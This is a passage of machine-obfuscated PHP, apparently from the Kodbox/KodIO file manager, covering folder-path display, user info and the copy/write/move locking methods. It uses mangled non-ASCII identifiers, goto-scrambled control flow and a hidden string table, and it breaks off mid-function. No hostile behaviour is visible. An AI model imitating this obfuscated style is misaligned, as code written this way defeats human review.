$F™Çƒ¾…«ö[$dé…­ëİŒ[193]] = AuthModel::authCheckView($F™Çƒ¾…«ö[$dé…­ëİŒ[400]][$dé…­ëİŒ[401]]); } $this->groupPathDisplay($F™Çƒ¾…«ö); } unset($F™Çƒ¾…«ö); goto f‡ŸéëÇ…Ã; e”ôª¼Å¢Ù: $dé…­ëİŒ =& $_SERVER[…ë˜õ]; if (!defined($dé…­ëİŒ[448])) { return; } $dÎª¼½òİ¥ = array(); goto aÉ‚¶Í…çà; f‡ŸéëÇ…Ã: } public function groupPathDisplay(&$F´‰ã§Ì©œ) { goto FËõİ©ñ«Ï; FËõİ©ñ«Ï: $EÉ¡í÷çâ÷ =& $_SERVER[…ë˜õ]; if ($F´‰ã§Ì©œ[$EÉ¡í÷çâ÷[398]] != self::TYPE_GROUP) { return; } $eƒ¿í”—ˆ = Model($EÉ¡í÷çâ÷[480])->getInfo($F´‰ã§Ì©œ[$EÉ¡í÷çâ÷[478]]); goto e­È˜±­Àå; e­È˜±­Àå: $Eí´ë©Ëó = $this->parentLevelArray($eƒ¿í”—ˆ[$EÉ¡í÷çâ÷[481]]); $AÃ·©¶£¤è = $EÉ¡í÷çâ÷[33]; foreach ($Eí´ë©Ëó as $aäè¯Ã‚…†) { $B‘öëËÃÈ = Model($EÉ¡í÷çâ÷[480])->getInfo($aäè¯Ã‚…†); $AÃ·©¶£¤è .= $B‘öëËÃÈ[$EÉ¡í÷çâ÷[84]][$EÉ¡í÷çâ÷[390]] . $EÉ¡í÷çâ÷[47]; } goto BáÁ’šŸˆ¾; aßêÑ”ªíÑ: $F´‰ã§Ì©œ[$EÉ¡í÷çâ÷[486]] = $AÃ·©¶£¤è . $eƒ¿í”—ˆ[$EÉ¡í÷çâ÷[84]][$EÉ¡í÷çâ÷[390]]; goto fÕìï¸Ö½à; BáÁ’šŸˆ¾: $F´‰ã§Ì©œ[$EÉ¡í÷çâ÷[482]] = $eƒ¿í”—ˆ[$EÉ¡í÷çâ÷[472]]; $F´‰ã§Ì©œ[$EÉ¡í÷çâ÷[483]] = $eƒ¿í”—ˆ[$EÉ¡í÷çâ÷[481]]; $F´‰ã§Ì©œ[$EÉ¡í÷çâ÷[484]] = $eƒ¿í”—ˆ[$EÉ¡í÷çâ÷[485]]; goto aßêÑ”ªíÑ; fÕìï¸Ö½à: } protected function _listAppendPath(&$a¨ŸñÅ¥») { goto b¢Œ·ã¼æ¬; DñóÊÀºó‚: $aÙ˜´Ê®ß± = array(); $eäƒğœ¡¡¿ = array(); foreach ($a¨ŸñÅ¥» as &$Cî¸½’¸Ê) { goto cÖÇàÙ±á¨; cÖÇàÙ±á¨: $d…’îùÆæ± = $Cî¸½’¸Ê[$A…¤É›¤¾é[481]]; if (isset($eäƒğœ¡¡¿[$d…’îùÆæ±])) { $cˆ§‡×¸Âš = $aÙ˜´Ê®ß±[$d…’îùÆæ±]; } else { $C¥¯‘Á³àº = $this->parentLevelArray($Cî¸½’¸Ê[$A…¤É›¤¾é[481]]); $fÒ™ˆ‹÷× = $A…¤É›¤¾é[488] . $Cî¸½’¸Ê[$A…¤É›¤¾é[398]] . $A…¤É›¤¾é[434] . $Cî¸½’¸Ê[$A…¤É›¤¾é[478]]; if ($aÙ˜´Ê®ß±[$fÒ™ˆ‹÷×]) { $cˆ§‡×¸Âš = $aÙ˜´Ê®ß±[$fÒ™ˆ‹÷×]; } else { $cˆ§‡×¸Âš = $this->_listAppendPathRoot($Cî¸½’¸Ê, $C¥¯‘Á³àº); $aÙ˜´Ê®ß±[$fÒ™ˆ‹÷×] = $cˆ§‡×¸Âš; } foreach ($C¥¯‘Á³àº as $FƒÙ­È†Œ => $FÉÏ´ Áƒ¶) { if ($FƒÙ­È†Œ == 0 && $cˆ§‡×¸Âš && $Cî¸½’¸Ê[$A…¤É›¤¾é[398]] == self::TYPE_GROUP) { continue; } if (isset($eÀ„¯ßÂÆÙ[$FÉÏ´ Áƒ¶])) { $cˆ§‡×¸Âš .= $eÀ„¯ßÂÆÙ[$FÉÏ´ Áƒ¶] . $A…¤É›¤¾é[8]; } } if ($C¥¯‘Á³àº) { $cˆ§‡×¸Âš .= $Cî¸½’¸Ê[$A…¤É›¤¾é[28]]; } $aÙ˜´Ê®ß±[$d…’îùÆæ±] = $cˆ§‡×¸Âš; } if ($Cî¸½’¸Ê[$A…¤É›¤¾é[397]]) { $cˆ§‡×¸Âš .= $A…¤É›¤¾é[8]; } goto d‚’¨òõ™³; dœÉÂŠ§ª‹: if (intval($Cî¸½’¸Ê[$A…¤É›¤¾é[398]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Cî¸½’¸Ê, $C¥¯‘Á³àº, $dôµ¡™¸ó); } goto cñä’õìÙñ; d‚’¨òõ™³: $Cî¸½’¸Ê[$A…¤É›¤¾é[489]] = str_replace($A…¤É›¤¾é[490], $A…¤É›¤¾é[8], $cˆ§‡×¸Âš); $a¢Õ¡–ß†Ñ = trim($Cî¸½’¸Ê[$A…¤É›¤¾é[489]], $A…¤É›¤¾é[8]); if ($Cî¸½’¸Ê[$A…¤É›¤¾é[472]] == $A…¤É›¤¾é[491] && $a¢Õ¡–ß†Ñ) { $Cî¸½’¸Ê[$A…¤É›¤¾é[28]] = $a¢Õ¡–ß†Ñ; } goto dœÉÂŠ§ª‹; cñä’õìÙñ: } goto B‹ÂÔÎ´áÓ; d‹îß–Äâö: $CÁ¬òš¦ÉÜ = array(); foreach ($a¨ŸñÅ¥» as &$Cî¸½’¸Ê) { $câ…¦·öà­ = $Cî¸½’¸Ê[$A…¤É›¤¾é[397]] == $A…¤É›¤¾é[86]; if ($câ…¦·öà­) { $eÀ„¯ßÂÆÙ[$Cî¸½’¸Ê[$A…¤É›¤¾é[390]]] = $Cî¸½’¸Ê[$A…¤É›¤¾é[28]]; } if (isset($CÁ¬òš¦ÉÜ[$Cî¸½’¸Ê[$A…¤É›¤¾é[481]]])) { continue; } $CÁ¬òš¦ÉÜ[$Cî¸½’¸Ê[$A…¤É›¤¾é[481]]] = !0; $C¥¯‘Á³àº = $this->parentLevelArray($Cî¸½’¸Ê[$A…¤É›¤¾é[481]]); foreach ($C¥¯‘Á³àº as $FƒÙ­È†Œ => $FÉÏ´ Áƒ¶) { if ($FƒÙ­È†Œ != 0 && !isset($eÀ„¯ßÂÆÙ[$FÉÏ´ Áƒ¶])) { $eœƒÑŞ’‘[] = $FÉÏ´ Áƒ¶; } } } unset($Cî¸½’¸Ê); goto bŸÔ§ø‘Ï; bŸÔ§ø‘Ï: $eœƒÑŞ’‘ = array_unique($eœƒÑŞ’‘); if (count($eœƒÑŞ’‘) > 0) { $cÑ®Üàö¬ = array($A…¤É›¤¾é[404] => array($A…¤É›¤¾é[405], $eœƒÑŞ’‘)); if (count($eœƒÑŞ’‘) == 1) { $EºÚƒ‚éÄÂ = $this->sourceInfo($eœƒÑŞ’‘[0]); $F‡½½†È¦ = is_array($EºÚƒ‚éÄÂ) ? array($EºÚƒ‚éÄÂ) : !1; } else { $F‡½½†È¦ = $this->field($A…¤É›¤¾é[487])->where($cÑ®Üàö¬)->select(); } if (!$F‡½½†È¦) { $F‡½½†È¦ = array(); } foreach ($F‡½½†È¦ as $FÚÓªŠÎšß) { $eÀ„¯ßÂÆÙ[$FÚÓªŠÎšß[$A…¤É›¤¾é[390]]] = $FÚÓªŠÎšß[$A…¤É›¤¾é[28]]; } } $dôµ¡™¸ó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto DñóÊÀºó‚; b¢Œ·ã¼æ¬: $A…¤É›¤¾é =& $_SERVER[…ë˜õ]; static $eÀ„¯ßÂÆÙ = array(); $eœƒÑŞ’‘ = array(); goto d‹îß–Äâö; B‹ÂÔÎ´áÓ: unset($Cî¸½’¸Ê); return $a¨ŸñÅ¥»; goto EŞí…ÇÜÚš; EŞí…ÇÜÚš: } private function _listAppendPathRecycle(&$AÚ˜¾•ğì, $C®’‰‘«È, $d¦†Ğà§ƒ¾) { goto aŒìßĞÚĞí; aŒìßĞÚĞí: $CœİÏ‹ñ‘Š =& $_SERVER[…ë˜õ]; if (!in_array($d¦†Ğà§ƒ¾, $C®’‰‘«È) && $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[390]] != $d¦†Ğà§ƒ¾) { return; } $BË»‘‚¿Û¡ = explode($CœİÏ‹ñ‘Š[8], trim($AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[489]], $CœİÏ‹ñ‘Š[8])); goto cã¹Ãõ¡; D´ÚìèÇç: if ($AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[390]] == $d¦†Ğà§ƒ¾) { $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[481]] = $CœİÏ‹ñ‘Š[493]; $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[472]] = $CœİÏ‹ñ‘Š[491]; $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[28]] = LNG($CœİÏ‹ñ‘Š[492]); } $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[494]] = $CœİÏ‹ñ‘Š[495]; goto eİõãôàÖ…; cã¹Ãõ¡: $b»–®²ÌÍ‘ = implode($CœİÏ‹ñ‘Š[8], array_slice($BË»‘‚¿Û¡, 2)); $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[489]] = $CœİÏ‹ñ‘Š[8] . LNG($CœİÏ‹ñ‘Š[492]) . $CœİÏ‹ñ‘Š[8] . ltrim($b»–®²ÌÍ‘, $CœİÏ‹ñ‘Š[8]); $AÚ˜¾•ğì[$CœİÏ‹ñ‘Š[481]] = $CœİÏ‹ñ‘Š[493] . implode($CœİÏ‹ñ‘Š[47], array_slice($C®’‰‘«È, 1)) . $CœİÏ‹ñ‘Š[47]; goto D´ÚìèÇç; eİõãôàÖ…: } protected function _listAppendPathRoot(&$B§ö‡í‡éä, $B÷‡İÔÆã•) { $Eè¯’’«Ù =& $_SERVER[…ë˜õ]; $fãåì±ì¨“ = $Eè¯’’«Ù[33]; if ($B§ö‡í‡éä[$Eè¯’’«Ù[398]] == self::TYPE_USER) { if (defined($Eè¯’’«Ù[448]) && $B§ö‡í‡éä[$Eè¯’’«Ù[478]] == USER_ID) { $fãåì±ì¨“ = LNG($Eè¯’’«Ù[496]); if (!$B÷‡İÔÆã•) { $B§ö‡í‡éä[$Eè¯’’«Ù[28]] = $fãåì±ì¨“; } } else { $C¸î²ÂõÉº = Model($Eè¯’’«Ù[497])->getInfoSimple($B§ö‡í‡éä[$Eè¯’’«Ù[478]]); $fãåì±ì¨“ = LNG($Eè¯’’«Ù[498]) . $Eè¯’’«Ù[159] . $C¸î²ÂõÉº[$Eè¯’’«Ù[28]] . $Eè¯’’«Ù[499]; } } else { if ($B§ö‡í‡éä[$Eè¯’’«Ù[398]] == self::TYPE_GROUP) { $C¸î²ÂõÉº = Model($Eè¯’’«Ù[480])->getInfoSimple($B§ö‡í‡éä[$Eè¯’’«Ù[478]]); $fãåì±ì¨“ = $C¸î²ÂõÉº[$Eè¯’’«Ù[28]]; } else { if ($B§ö‡í‡éä[$Eè¯’’«Ù[398]] == self::TYPE_SYSTEM) { $fãåì±ì¨“ = $Eè¯’’«Ù[500]; } } } $fãåì±ì¨“ = $fãåì±ì¨“ ? $Eè¯’’«Ù[8] . $fãåì±ì¨“ . $Eè¯’’«Ù[8] : $Eè¯’’«Ù[8]; return $fãåì±ì¨“; } protected function _listAppendUser(&$D„»‚¬Ä°³) { goto BÌÎ¸î„Õ–; BÌÎ¸î„Õ–: $D™¥İ±‰ÚÌ =& $_SERVER[…ë˜õ]; $eÇš‡æÂ‡Ì = array_to_keyvalue($D„»‚¬Ä°³, $D™¥İ±‰ÚÌ[33], $D™¥İ±‰ÚÌ[426]); $f²‚É†ë°÷ = array_to_keyvalue($D„»‚¬Ä°³, $D™¥İ±‰ÚÌ[33], $D™¥İ±‰ÚÌ[428]); goto b­ÛÜÈ°†´; b­ÛÜÈ°†´: $eÂ‡Ø®ºƒ = array_merge($eÇš‡æÂ‡Ì, $f²‚É†ë°÷); $EŸ»ã½Ë = Model($D™¥İ±‰ÚÌ[501])->userListInfo($eÂ‡Ø®ºƒ); foreach ($D„»‚¬Ä°³ as &$A®†÷ùõï”) { $C›ÜÆÕšËô = $A®†÷ùõï”[$D™¥İ±‰ÚÌ[426]]; $A®†÷ùõï”[$D™¥İ±‰ÚÌ[426]] = $EŸ»ã½Ë[$C›ÜÆÕšËô] ? $EŸ»ã½Ë[$C›ÜÆÕšËô] : !1; $C›ÜÆÕšËô = $A®†÷ùõï”[$D™¥İ±‰ÚÌ[428]]; $A®†÷ùõï”[$D™¥İ±‰ÚÌ[428]] = $EŸ»ã½Ë[$C›ÜÆÕšËô] ? $EŸ»ã½Ë[$C›ÜÆÕšËô] : !1; if (isset($A®†÷ùõï”[$D™¥İ±‰ÚÌ[439]]) && $A®†÷ùõï”[$D™¥İ±‰ÚÌ[439]][$D™¥İ±‰ÚÌ[502]]) { $AËçìáÇÒ¦ = $GLOBALS[$D™¥İ±‰ÚÌ[6]][$D™¥İ±‰ÚÌ[87]][$D™¥İ±‰ÚÌ[503]]; if ($A®†÷ùõï”[$D™¥İ±‰ÚÌ[439]][$D™¥İ±‰ÚÌ[504]] <= time() - $AËçìáÇÒ¦) { $this->metaSet($A®†÷ùõï”[$D™¥İ±‰ÚÌ[390]], $D™¥İ±‰ÚÌ[502], null); $this->metaSet($A®†÷ùõï”[$D™¥İ±‰ÚÌ[390]], $D™¥İ±‰ÚÌ[504], null); unset($A®†÷ùõï”[$D™¥İ±‰ÚÌ[439]][$D™¥İ±‰ÚÌ[502]]); continue; } $AÒîÂ¼İ‡† = $A®†÷ùõï”[$D™¥İ±‰ÚÌ[439]][$D™¥İ±‰ÚÌ[502]]; $A®†÷ùõï”[$D™¥İ±‰ÚÌ[439]][$D™¥İ±‰ÚÌ[505]] = Model($D™¥İ±‰ÚÌ[501])->getInfoSimpleOuter($AÒîÂ¼İ‡†); } } goto A °ˆìƒÖ§; A °ˆìƒÖ§: unset($A®†÷ùõï”); goto a¦ÊÆÀ…; a¦ÊÆÀ…: } public function parentLevelArray($eÊ‹œ¼¸÷ç) { $F‚‘­Äƒ„† =& $_SERVER[…ë˜õ]; $eÊ‹œ¼¸÷ç = explode($F‚‘­Äƒ„†[47], trim($eÊ‹œ¼¸÷ç, $F‚‘­Äƒ„†[47])); return array_remove_value($eÊ‹œ¼¸÷ç, $F‚‘­Äƒ„†[491]); } public function listAll($B§­ÃÖÅéÕ) { goto E¸­¬Ñ°á; DÊôêöê: $this->_listAppendAuth($bÆ‰á‰¦…); $this->_listAppendUser($bÆ‰á‰¦…); $this->_listAppendPath($bÆ‰á‰¦…); goto bƒÊ¶«Ë°; E¸­¬Ñ°á: $d¡·ˆ„Œ›™ =& $_SERVER[…ë˜õ]; $dˆÆ’í¥Ô = $this->sourceInfo($B§­ÃÖÅéÕ); $eÇ¯»·ßŸÔ = array($d¡·ˆ„Œ›™[506] => array($d¡·ˆ„Œ›™[507], $dˆÆ’í¥Ô[$d¡·ˆ„Œ›™[481]] . $B§­ÃÖÅéÕ . $d¡·ˆ„Œ›™[508]), $d¡·ˆ„Œ›™[509] => 0); goto Eè‚Ë˜Òƒ÷; bƒÊ¶«Ë°: $bÆ‰á‰¦… = array_to_keyvalue($bÆ‰á‰¦…, $d¡·ˆ„Œ›™[390]); $a‹¯ÓàâÛ‘ = "\57{$dˆÆ’í¥Ô[$d¡·ˆ„Œ›™[28]]}\57"; $a‹¯ÓàâÛ‘ = $a‹¯ÓàâÛ‘ == $d¡·ˆ„Œ›™[490] ? $d¡·ˆ„Œ›™[8] : $a‹¯ÓàâÛ‘; goto B‰ÊÛãÓ¯; B‰ÊÛãÓ¯: $Cá‘£ö™š” = array(); foreach ($bÆ‰á‰¦… as $B©™ñÀŞÍ => $D…ØÏõ‡) { goto e²£ãù”×´; d“ó¦«îÀ÷: if (!$D…ØÏõ‡[$d¡·ˆ„Œ›™[397]]) { $d¡ÄÄ°¡é [$d¡·ˆ„Œ›™[441]] = $D…ØÏõ‡[$d¡·ˆ„Œ›™[441]]; $d¡ÄÄ°¡é [$d¡·ˆ„Œ›™[85]] = $D…ØÏõ‡[$d¡·ˆ„Œ›™[75]]; } $Cá‘£ö™š”[] = $d¡ÄÄ°¡é ; goto eÃÌğåâ¤ˆ; aîĞ±ÚÛé¼: $Bš¶¹˜¶‚Ë = str_replace($d¡·ˆ„Œ›™[490], $d¡·ˆ„Œ›™[8], $Bš¶¹˜¶‚Ë); $Bš¶¹˜¶‚Ë = str_replace($d¡·ˆ„Œ›™[490], $d¡·ˆ„Œ›™[8], $Bš¶¹˜¶‚Ë); $d¡ÄÄ°¡é  = array($d¡·ˆ„Œ›™[408] => str_replace($d¡·ˆ„Œ›™[490], $d¡·ˆ„Œ›™[8], $Bš¶¹˜¶‚Ë), $d¡·ˆ„Œ›™[512] => intval($D…ØÏõ‡[$d¡·ˆ„Œ›™[397]]), $d¡·ˆ„Œ›™[84] => $this->pathInfoFilter($D…ØÏõ‡)); goto d“ó¦«îÀ÷; e²£ãù”×´: $dğ÷Á…âÌ‹ = $this->parentLevelArray($D…ØÏõ‡[$d¡·ˆ„Œ›™[481]]); array_shift($dğ÷Á…âÌ‹); $Bš¶¹˜¶‚Ë = $a‹¯ÓàâÛ‘; goto aÎÅªŸŒÑĞ; aÎÅªŸŒÑĞ: for ($bÊµ™§ = 0; $bÊµ™§ < count($dğ÷Á…âÌ‹); $bÊµ™§++) { $Bš¶¹˜¶‚Ë .= $bÆ‰á‰¦…[$dğ÷Á…âÌ‹[$bÊµ™§]][$d¡·ˆ„Œ›™[28]] . $d¡·ˆ„Œ›™[8]; } $Bš¶¹˜¶‚Ë .= $D…ØÏõ‡[$d¡·ˆ„Œ›™[28]]; if ($D…ØÏõ‡[$d¡·ˆ„Œ›™[397]]) { $Bš¶¹˜¶‚Ë .= $d¡·ˆ„Œ›™[8]; } goto aîĞ±ÚÛé¼; eÃÌğåâ¤ˆ: } return $Cá‘£ö™š”; goto fòâÀ¼§òÙ; Eè‚Ë˜Òƒ÷: $CÆØŒ¬£ğƒ = $d¡·ˆ„Œ›™[510]; $EóŞÍÀ¡Íå = "\x4c\105\x46\124\x20\x4a\117\x49\116\40{$this->tablePrefix}\x69\x6f\137\x66\151\154\x65\x20\x66\151\154\x65\40\157\x6e\40\x73\x6f\x75\162\x63\x65\56\x66\x69\154\145\111\x44\40\x3d\40\x66\151\154\x65\x2e\x66\151\154\x65\x49\x44"; $bÆ‰á‰¦… = $this->alias($d¡·ˆ„Œ›™[511])->field($CÆØŒ¬£ğƒ)->where($eÇ¯»·ßŸÔ)->join($EóŞÍÀ¡Íå)->select(); goto DÊôêöê; fòâÀ¼§òÙ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($a²‡Àİ÷¯È) { goto cò“«Ü÷ƒñ; cµÀŒ³…˜ù: $this->_lockEvent($a²‡Àİ÷¯È, array($Eëª×·Ï’¯[516], $Eëª×·Ï’¯[517]), $cÓ“œ‘È¹–); $this->_lockCheckEnd($Eëª×·Ï’¯[513], $a²‡Àİ÷¯È); goto Aâä²Ğ»Æ×; cò“«Ü÷ƒñ: $Eëª×·Ï’¯ =& $_SERVER[…ë˜õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Eëª×·Ï’¯[513], $a²‡Àİ÷¯È); goto D›‹šªÑµ¶; D›‹šªÑµ¶: $cÓ“œ‘È¹– = 1; $this->_lockEvent($a²‡Àİ÷¯È, array($Eëª×·Ï’¯[514], $Eëª×·Ï’¯[515]), $cÓ“œ‘È¹–); $this->_lockParent($a²‡Àİ÷¯È, array($Eëª×·Ï’¯[515]), $cÓ“œ‘È¹–); goto cµÀŒ³…˜ù; Aâä²Ğ»Æ×: } public function lockCopyEnd($EÌ¹Š¾¨á) { $AËÍ·ºç×Ó =& $_SERVER[…ë˜õ]; if (!$this->allowLock()) { return; } $Dİò‹é÷Í = 0; $this->_lockEvent($EÌ¹Š¾¨á, array($AËÍ·ºç×Ó[514], $AËÍ·ºç×Ó[515]), $Dİò‹é÷Í); $this->_lockParent($EÌ¹Š¾¨á, array($AËÍ·ºç×Ó[515]), $Dİò‹é÷Í); $this->_lockEvent($EÌ¹Š¾¨á, array($AËÍ·ºç×Ó[516], $AËÍ·ºç×Ó[517]), $Dİò‹é÷Í); } public function lockWriteStart($BğÌÓç¯¾´, $a¦‡¶¢Æ³ = '') { goto DÈ«ø‘ ”³; DÈ«ø‘ ”³: $DÚÅ÷·ÆÆó =& $_SERVER[…ë˜õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÚÅ÷·ÆÆó[514], $BğÌÓç¯¾´); goto cÍ‹ë‘Àù´; Fˆåæ‘°®ë: $this->_lockParent($BğÌÓç¯¾´, array($DÚÅ÷·ÆÆó[513], $DÚÅ÷·ÆÆó[515]), $A¸Üø›Ø’³); $this->_lockCheckEnd($DÚÅ÷·ÆÆó[514], $BğÌÓç¯¾´); goto C´Ù§ĞÆõ‚; cÍ‹ë‘Àù´: $A¸Üø›Ø’³ = 1; $this->_lockKey($DÚÅ÷·ÆÆó[518] . $BğÌÓç¯¾´ . $DÚÅ÷·ÆÆó[94] . $a¦‡¶¢Æ³, $A¸Üø›Ø’³); $this->_lockEvent($BğÌÓç¯¾´, array($DÚÅ÷·ÆÆó[513], $DÚÅ÷·ÆÆó[515]), $A¸Üø›Ø’³); goto Fˆåæ‘°®ë; C´Ù§ĞÆõ‚: } public function lockWriteEnd($díãÖ¾ÂŸå, $D®³Ö®’ä‡ = '') { $EÚØ†Ô³ï³ =& $_SERVER[…ë˜õ]; if (!$this->allowLock()) { return; } $eí ³›ƒª = 0; $this->_lockKey($EÚØ†Ô³ï³[518] . $díãÖ¾ÂŸå . $EÚØ†Ô³ï³[94] . $D®³Ö®’ä‡, $eí ³›ƒª); $this->_lockEvent($díãÖ¾ÂŸå, array($EÚØ†Ô³ï³[513], $EÚØ†Ô³ï³[515]), $eí ³›ƒª); $this->_lockParent($díãÖ¾ÂŸå, array($EÚØ†Ô³ï³[513], $EÚØ†Ô³ï³[515]), $eí ³›ƒª); } public function lockMoveStart($DŠœ™¢æ‘) { goto dÃÖŠùŒà×; E”ã–†„é–: $aÓŠ™Óù® = 1; $this->_lockKey($B¾‰åœí†Ã[519] . $DŠœ™¢æ‘, $aÓŠ™Óù®); $this->_lockEvent($DŠœ™¢æ‘, array($B¾‰åœí†Ã[513], $B¾‰åœí†Ã[514]), $aÓŠ™Óù®); goto eõœ­”Ìš; dÃÖŠùŒà×: $B¾‰åœí†Ã =& $_SERVER[…ë˜õ]; if (!$this->allowLock()) { return; } $this->_lockCheck($B¾‰åœí†Ã[515], $DŠœ™¢æ‘); goto E”ã–†„é–; eõœ­”Ìš: $this->_lockParent($DŠœ™¢æ‘, array($B¾‰åœí†Ã[513], $B¾‰åœí†Ã[515]), $aÓŠ™Óù®); $this->_lockEvent($DŠœ™¢æ‘, array($B¾‰åœí†Ã[520], $B¾‰åœí†Ã[516], $B¾‰åœí†Ã[517]), $aÓŠ™Óù®); $this->_lockCheckEnd($B¾‰åœí†Ã[515], $DŠœ™¢æ‘); goto B—À˜ŞçÌ; B—À˜ŞçÌ: } public function lockMoveEnd($dˆ…‚ì‚ßË) { goto cŞöà”Ûö‚; cŞöà”Ûö‚: $BÍÜå…²§¸ =& $_SERVER[…ë˜õ]; if (!$this->allowLock()) { return; } $A·Šò°íŞ‡ = 0; goto eØñî‘¥; fŸí©ê¹â…: $this->_lockEvent($dˆ…‚ì‚ßË, array($BÍÜå…²§¸[520], $BÍÜå…²§¸[516], $BÍÜå…²§¸[517]), $A·Šò°íŞ‡); goto a»ˆö Ô¼ä; eØñî‘¥: $this->_lockKey($BÍÜå…²§¸[519] . $dˆ…‚ì‚ßË, $A·Šò°íŞ‡); $this->_lockEvent($dˆ…‚ì‚ßË, array($BÍÜå…²§¸[513], $BÍÜå…²§¸[514]), $A·Šò°íŞ‡); $this->_lockParent($dˆ…‚ì‚ßË, array($BÍÜå…²§¸[513], $BÍÜå…²§¸[515]), $A·Šò°íŞ‡); goto fŸí©ê¹â…; a»ˆö Ô¼ä: } private function _lockCheck($C©ïÈ¢ÈÄÃ, $eºÕÄ¯Ù¦†) { goto e‘ÓœÖÉ“; D…Ê”–†ˆ‰: $eå…Ÿ±œ‰ = array_reverse($this->parentLevelArray($a‡ŠæÖ·›[$C²•ÒèÈÀŠ[481]])); foreach ($eå…Ÿ±œ‰ as $Dæó´˜Ö³²) { $cëíå†­¼ä = $C©ïÈ¢ÈÄÃ . $C²•ÒèÈÀŠ[522] . $Dæó´˜Ö³²; if (CacheLock::lockGet($C²•ÒèÈÀŠ[523] . $cëíå†­¼ä)) { $a‡ŠæÖ·› = $this->sourceInfo($Dæó´˜Ö³²); CacheLock::setErrorMsg($C²•ÒèÈÀŠ[159] . htmlspecialchars($a‡ŠæÖ·›[$C²•ÒèÈÀŠ[28]]) . $C²•ÒèÈÀŠ[499] . $B©Ù¡ôÔ); $this->_lockKey($cëíå†­¼ä, 1); $this->_lockKey($cëíå†­¼ä, 0); } } goto E„«¬Í§¹; c¡‚ßÓ›íæ: CacheLock::setErrorMsg($C²•ÒèÈÀŠ[159] . htmlspecialchars($a‡ŠæÖ·›[$C²•ÒèÈÀŠ[28]]) . $C²•ÒèÈÀŠ[499] . $B©Ù¡ôÔ); $this->_lockKey($cëíå†­¼ä, 1); $this->_lockKey($cëíå†­¼ä, 0); goto D…Ê”–†ˆ‰; c¾ì´ß§¿: $this->_lockTimeStart[$cëíå†­¼ä] = timeFloat(); if (!is_array($a‡ŠæÖ·›)) { return; } $B©Ù¡ôÔ = LNG($C²•ÒèÈÀŠ[521]); goto c¡‚ßÓ›íæ; e‘ÓœÖÉ“: $C²•ÒèÈÀŠ =& $_SERVER[…ë˜õ]; $a‡ŠæÖ·› = $this->sourceInfo($eºÕÄ¯Ù¦†); $cëíå†­¼ä = $C©ïÈ¢ÈÄÃ . $C²•ÒèÈÀŠ[94] . $eºÕÄ¯Ù¦†; goto c¾ì´ß§¿; E„«¬Í§¹: } private function _lockCheckEnd($a¸¤ÛÅåÌé, $E²Û¶‰± í) { goto f„‘Ö±½Šä; eßÓÔº¤…: if (!isset($this->_lockTimeStart[$B¹†Íø»Í])) { return; } $F…·öİÕ¼° = timeFloat() - $this->_lockTimeStart[$B¹†Íø»Í]; unset($this->_lockTimeStart[$B¹†Íø»Í]); goto cÃ×§Ü²”; f„‘Ö±½Šä: $bÛäø¸Œ½Û =& $_SERVER[…ë˜õ]; $B¹†Íø»Í = $a¸¤ÛÅåÌé . $bÛäø¸Œ½Û[94] . $E²Û¶‰± í; CacheLock::setErrorMsg($bÛäø¸Œ½Û[373]); goto eßÓÔº¤…; cÃ×§Ü²”: if ($F…·öİÕ¼° > 0.5) { unset(self::$cacheSourceInfo[$bÛäø¸Œ½Û[432] . $E²Û¶‰± í]); } $d·”÷äï· = $this->sourceInfo($E²Û¶‰± í); if (!$d·”÷äï·) { show_json(LNG($bÛäø¸Œ½Û[104]), !1); } goto Fâˆéº˜®š; Fâˆéº˜®š: } private function _lockParent($eÁ¥¸¢ƒÆ, $Ağœ¯´£æ®, $c»í˜Š»ùì) { if (!$this->autoLockSet) { return; } $fğåÙè…Ó = $this->sourceInfo($eÁ¥¸¢ƒÆ); if (!is_array($fğåÙè…Ó)) { return; } $Eèå‰éØ×­ = array_reverse($this->parentLevelArray($fğåÙè…Ó[$_SERVER[…ë˜õ][481]])); foreach ($Eèå‰éØ×­ as $eì×†—¦ŸÅ) { $this->_lockEvent($eì×†—¦ŸÅ, $Ağœ¯´£æ®, $c»í˜Š»ùì); } } private function _lockEvent($F‹Ÿé‘šÍ, $d°¸ÄŒ±Û, $EÜ­¢½·”ƒ) { $A¿ì‘‘¡™Á =& $_SERVER[…ë˜õ]; if (!$this->autoLockSet) { return; } foreach ($d°¸ÄŒ±Û as $aš´Ë®¨à) { $Fè«êªÚ£² = $aš´Ë®¨à . $A¿ì‘‘¡™Á[94] . $F‹Ÿé‘šÍ; if ($EÜ­¢½·”ƒ && CacheLock::lockGet($A¿ì‘‘¡™Á[523] . $Fè«êªÚ£²)) { continue; } $this->_lockKey($Fè«êªÚ£², $EÜ­¢½·”ƒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($D¡¨¨æŠ¤ë, $C°óŞ½Å¨´ = 1) { $F­•Ú¦É² = $_SERVER[…ë˜õ][523] . md5($D¡¨¨æŠ¤ë); if ($C°óŞ½Å¨´) { if (isset(self::$_lockItemArr[$F­•Ú¦É²])) { return; } self::$_lockItemArr[$F­•Ú¦É²] = 1; CacheLock::lock($F­•Ú¦É², $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$F­•Ú¦É²])) { return; } unset(self::$_lockItemArr[$F­•Ú¦É²]); CacheLock::unlock($F­•Ú¦É²); } } public function isParentOf($AÛ‰ƒ¯³¶, $Aõİ–»Ö¶) { goto d‘‡¼ƒ‰„Ş; B¬…Óöå³Í: $då×ôóÍËÆ = $A¢Ô ¡†ÚÒ[$bŒø“È‚¹ã[481]] . $A¢Ô ¡†ÚÒ[$bŒø“È‚¹ã[390]] . $bŒø“È‚¹ã[47]; $E¨ÏåÑ…’É = $FŞ˜Ç¨ÚÇæ[$bŒø“È‚¹ã[481]] . $FŞ˜Ç¨ÚÇæ[$bŒø“È‚¹ã[390]] . $bŒø“È‚¹ã[47]; $D¨É¨ÉË¡ = strpos($E¨ÏåÑ…’É, $då×ôóÍËÆ) === 0; goto 